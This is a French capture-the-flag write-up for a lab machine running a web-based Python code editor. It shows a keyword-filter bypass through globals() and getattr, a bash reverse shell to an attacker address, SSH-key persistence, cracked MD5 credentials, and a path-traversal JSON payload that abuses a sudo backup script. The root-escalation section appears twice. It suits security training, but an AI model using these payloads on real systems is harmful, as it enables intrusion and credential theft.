![Cover](cover.png)

### 1. Reconnaissance (Scanning & Énumération)

Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque. La machine expose deux services principaux.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 10.10.11.62

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,5000 -sCV 10.10.11.62
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 8.2p1 (Ubuntu 20.04).
*   **Port 5000 (HTTP) :** Serveur **Gunicorn** 20.0.4, indiquant une application **Python** (probablement **Flask**).

L'interface web est un **Python Code Editor** permettant d'exécuter du code directement dans le navigateur. Je note la présence de fonctionnalités d'authentification (`/login`, `/register`) et de sauvegarde de scripts (`/save_code`).

### 2. Analyse de l'Application Web

L'application utilise des **Flask Cookies** pour la gestion de session. En utilisant **flask-unsign**, je peux décoder le cookie pour inspecter les données stockées côté client.

```bash
# Décodage du cookie de session
flask-unsign -d -c ".eJx1jDEKAjEQRa8yTh22sdsbCBZiJ7IsQzIbB-IEMsmKLHt304pY_eK99zecl0T2YMPxviHUPvhkM4qMDk-6UpIAvnBgrULJBrgkJmOo5Q0USXTAaXe_7ZWjWC1UJStY876TpaUD3HIDTwqaX5ByhL8P5xzlK-3a5LAZl1kCjsf9A3p0QS8.Z-Mprw.Bl2n0KwU49LfnIGrB5TW-cw8lJA"
```

Le cookie contient un `user_id`, confirmant une architecture classique de base de données en backend. Un scan de répertoires avec **feroxbuster** ne révèle aucun point d'entrée caché, me ramenant à la fonctionnalité principale : l'exécution de code.

### 3. Identification de la Vulnérabilité (Deny List)

En tentant d'exécuter des commandes Python standards pour obtenir une **Remote Code Execution (RCE)**, je me heurte à un mécanisme de sécurité. L'application implémente une **Deny List** (liste noire) de mots-clés.

Mes tests révèlent que les termes suivants sont bloqués :
*   `import`
*   `os`
*   `subprocess`
*   `__builtins__`
*   `open`
*   `read`

Le filtre semble être une simple vérification de chaîne de caractères (string matching) avant l'exécution, car même des chaînes comme `ximportx` sont rejetées.

> **Schéma Mental :**
> L'application reçoit du code Python -> Elle vérifie la présence de mots interdits via un filtre statique -> Si absent, elle passe le code à une fonction type `exec()`. Pour contourner cela, je dois accéder aux fonctions dangereuses sans jamais taper leur nom explicitement dans mon payload.

### 4. Exploitation : Bypassing le Python Sandbox

Pour contourner ce filtre, j'utilise l'introspection Python. La fonction `globals()` retourne un dictionnaire de l'espace de nommage global, incluant souvent des modules déjà chargés comme `os`.

**Méthodologie du Bypass :**
1.  Accéder au module `os` via `globals()` en utilisant la concaténation de chaînes : `globals()['o' + 's']`.
2.  Récupérer la méthode `popen` via `getattr()` pour éviter le mot-clé bloqué.
3.  Exécuter une commande système et lire le résultat en reconstruisant la méthode `read()`.

**Payload de test (ID) :**
```python
print(getattr(globals()['o'+'s'], 'po'+'pen')('id').read())
```
*Note : Si `read` est bloqué, j'utilise à nouveau `getattr(..., 're'+'ad')()`.*

### 5. Obtention du Premier Shell

Une fois la **RCE** confirmée, je génère un **Reverse Shell** Bash classique. Je l'encode pour éviter tout problème de caractères spéciaux dans la requête POST vers `/run_code`.

```bash
# Payload final pour le reverse shell
getattr(globals()['o'+'s'], 'po'+'pen')('bash -c "bash -i >& /dev/tcp/10.10.14.X/443 0>&1"').read()
```

Je reçois une connexion sur mon listener **netcat** en tant qu'utilisateur `app-production`.

```bash
nc -lvnp 443
# Stabilisation du shell (TTY Upgrade)
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je peux désormais lire le premier flag dans `/home/app-production/user.txt`. Pour garantir la persistance, j'ajoute ma clé publique SSH dans `.ssh/authorized_keys`.

```bash
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAC3... user@host" > ~/.ssh/authorized_keys
```

---

### Énumération Interne & Pivot vers l'utilisateur Martin

Une fois le **Reverse Shell** stabilisé sur l'utilisateur `app-production`, j'entame une phase d'énumération locale pour identifier des vecteurs de mouvement latéral.

#### Énumération de la base de données
Le répertoire de l'application contient une instance **SQLite**. C'est souvent là que sont stockées les informations d'authentification des utilisateurs du portail.

```bash
# Localisation de la DB
ls -la /home/app-production/app/instance/database.db

# Exploration des tables
sqlite3 /home/app-production/app/instance/database.db ".tables"
# Résultat : code  user

# Extraction des credentials
sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;"
# 1|development|759b74ce43947f5f4c91aeddc3e5bad3
# 2|martin|3de6f30c4a09c27fc71932bfc68474be
```

> **Schéma Mental :** Accès Système -> Lecture de la base de données locale -> Extraction de **Hashes MD5** -> Préparation du mouvement latéral via **Credential Reuse**.

#### Cracking de Hash & Pivot
Les hashes identifiés sont au format **MD5** (32 caractères hexadécimaux). Comme ils ne sont pas "saltés", une simple recherche sur **CrackStation** ou un brute-force rapide suffit.

*   `759b74ce43947f5f4c91aeddc3e5bad3` : `development`
*   `3de6f30c4a09c27fc71932bfc68474be` : `nafeelswordsmaster`

Le mot de passe de `martin` permet une connexion via **SSH** ou un simple `su`.

```bash
ssh martin@10.10.11.62
# Password: nafeelswordsmaster
```

---

### Escalade de Privilèges : Root

#### Analyse des droits Sudo
L'énumération des privilèges de `martin` révèle une configuration **Sudoers** intéressante.

```bash
martin@code:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

L'utilisateur peut exécuter un script **Bash** nommé `backy.sh` avec les droits **root**. Ce script sert de **Wrapper** pour un utilitaire de sauvegarde nommé `backy`.

#### Analyse de la vulnérabilité dans backy.sh
Le script tente de sécuriser les sauvegardes en filtrant les entrées utilisateur via **jq** et en vérifiant que les chemins commencent par `/var/` ou `/home/`.

```bash
# Extrait critique du script :
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

La vulnérabilité réside dans l'utilisation de `gsub("\\.\\./"; "")`. Ce filtre n'est pas récursif. Si j'injecte la séquence `....//`, le filtre supprime la première occurrence de `../` trouvée à l'intérieur, laissant une séquence `../` valide derrière elle.

> **Schéma Mental :** Analyse du Wrapper -> Identification d'un filtre **Path Traversal** non-récursif -> Bypass via **Double Payload** -> Accès hors des répertoires autorisés (`/root`).

#### Exploitation du Path Traversal
Je crée un fichier `task.json` malveillant pour forcer la sauvegarde du répertoire `/root`.

```bash
# Création du payload dans /dev/shm
cat << EOF > /dev/shm/exploit.json
{
  "destination": "/dev/shm/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
EOF

# Exécution du script avec les droits root
sudo /usr/bin/backy.sh /dev/shm/exploit.json
```

Le script transforme `/var/....//root/` en `/var/../root/`, ce qui est un chemin valide pointant vers la racine du système de fichiers.

#### Extraction des secrets
Le script génère une archive compressée dans `/dev/shm/`. Il ne reste plus qu'à l'extraire pour récupérer le flag ou la clé SSH de root.

```bash
cd /dev/shm/
tar xjf code_var_.._root_*.tar.bz2
cat root/root.txt
cat root/.ssh/id_rsa
```

---

### Analyse Post-Exploitation (Beyond Root)

#### La protection "Protected Regular"
Lors de l'exploitation, si le fichier `task.json` appartient à `martin` mais que **root** tente d'écrire dedans (via la redirection `> "$json_file"` dans le script), cela peut échouer dans certains répertoires comme `/tmp` ou `/dev/shm` à cause du paramètre kernel **fs.protected_regular**.

*   **Comportement :** Empêche un utilisateur privilégié d'écrire dans un fichier appartenant à un autre utilisateur dans un répertoire avec le **Sticky Bit**.
*   **Conséquence imprévue :** Si l'écriture échoue, le script continue parfois avec le fichier original non filtré, permettant un **Path Traversal** direct sans même utiliser le bypass `....//`.

#### Alternative via SQLAlchemy
Il était possible d'énumérer la base de données directement depuis l'éditeur de code Python (Foothold) en accédant aux objets **SQLAlchemy** chargés en mémoire via `globals()`.

```python
# Payload pour l'éditeur web
print(globals()['User'].query.all())
# Permet de dumper les objets User et leurs attributs (username/password) sans shell.
```

---

# Élévation de Privilèges & Domination

## Étape 1 : Mouvement Latéral vers Martin

Après avoir obtenu un accès initial en tant que **app-production**, j'énumère le système de fichiers à la recherche de vecteurs de pivot. Je découvre une base de données **SQLite** située dans `/home/app-production/app/instance/database.db`.

```bash
# Extraction des hashes MD5
sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;"
# Résultat : 2|martin|3de6f30c4a09c27fc71932bfc68474be
```

Le hash de **martin** est un **MD5** non salé. Une simple recherche sur **CrackStation** ou une attaque par dictionnaire avec **Hashcat** révèle le mot de passe en clair : `nafeelswordsmaster`. Ce mot de passe est valide pour **SSH**.

```bash
ssh martin@10.10.11.62
```

## Étape 2 : Analyse du vecteur Root (backy.sh)

L'énumération des droits **Sudo** montre que **martin** peut exécuter un script spécifique avec les privilèges de **root** sans mot de passe.

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Le script `/usr/bin/backy.sh` est un wrapper autour d'un utilitaire de sauvegarde nommé **backy** (écrit en Go). Le script effectue les actions suivantes :
1. Il prend un fichier `task.json` en argument.
2. Il utilise **jq** pour tenter de supprimer les séquences de **Path Traversal** (`../`).
3. Il vérifie que les répertoires à archiver commencent par `/var/` ou `/home/`.

> **Schéma Mental : Logique de la vulnérabilité backy.sh**
> 
> [Input: task.json] -> [Filtre JQ: gsub("\\.\\./"; "")] -> [Vérification: Prefix /var/ ou /home/] -> [Exécution: backy]
> 
> La faille réside dans le filtre **JQ** : il n'est pas récursif. Si j'injecte `....//`, le filtre retire `../` une seule fois, laissant une séquence `../` valide derrière lui.

## Étape 3 : Exploitation du Path Traversal

Pour compromettre **root**, je crée un fichier `task.json` malveillant qui utilise cette faiblesse de filtrage pour sortir de `/var/` et cibler `/root/`.

```json
{
  "destination": "/dev/shm/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
```

J'exécute ensuite le script via **sudo**. Le filtre **JQ** transforme `/var/....//root/` en `/var/../root/`, ce qui est un chemin valide pointant vers le répertoire personnel de **root**, tout en satisfaisant la condition de préfixe `/var/`.

```bash
sudo /usr/bin/backy.sh /home/martin/task.json
```

L'archive générée dans `/dev/shm/` contient l'intégralité du répertoire `/root`. Je peux alors extraire la **SSH Private Key** (`id_rsa`) ou lire directement le flag.

```bash
cd /dev/shm
tar xjf code_var_.._root_*.tar.bz2
cat root/root.txt
```

# Beyond Root : Analyse Post-Exploitation

## Protection Kernel : Protected Regular

Lors de l'exploitation, si le fichier `task.json` est placé dans `/dev/shm` ou `/tmp`, le script peut échouer avec un message `Permission denied` lors de l'écriture par **root**. Cela est dû à la directive de sécurité du **Kernel Linux** nommée **fs.protected_regular**.

Cette mesure empêche **root** d'écrire dans un fichier régulier situé dans un répertoire avec le **Sticky Bit** (comme `/tmp`) s'il appartient à un autre utilisateur. C'est une défense contre les attaques de type **Symlink Race** et les écroulements de privilèges.

## Vecteur Non-Intentionnel : Bash Error Handling

Le script **Bash** ne possède pas de directive `set -e`. Par conséquent, si la commande **JQ** échoue (par exemple à cause de la protection **protected_regular** mentionnée ci-dessus), le script continue son exécution. 

Si je place mon `task.json` dans `/dev/shm` avec un **Path Traversal** classique (`/var/../root`), la réécriture par **JQ** échoue, mais la variable `directories_to_archive` conserve la valeur brute non filtrée. Le script passe alors ce chemin non assaini directement à l'exécutable **backy**, permettant une compromission totale sans même exploiter la faiblesse du `gsub`.

## Alternative Foothold : Introspection SQLAlchemy

Plutôt que de chercher un **RCE** complexe via le filtrage de mots-clés Python, il était possible d'abuser de l'**ORM SQLAlchemy** présent dans l'environnement de l'éditeur de code. 

En accédant à `globals()`, on peut identifier l'objet `User`. Puisque cet objet est lié à la base de données, l'utilisation de `User.query.all()` permet d'extraire les objets utilisateurs directement depuis la mémoire du processus web, révélant les hashes MD5 sans jamais avoir besoin d'un shell initial sur la machine.

```python
# Exemple d'extraction via l'éditeur web
print([u.password for u in globals()['User'].query.all()])
```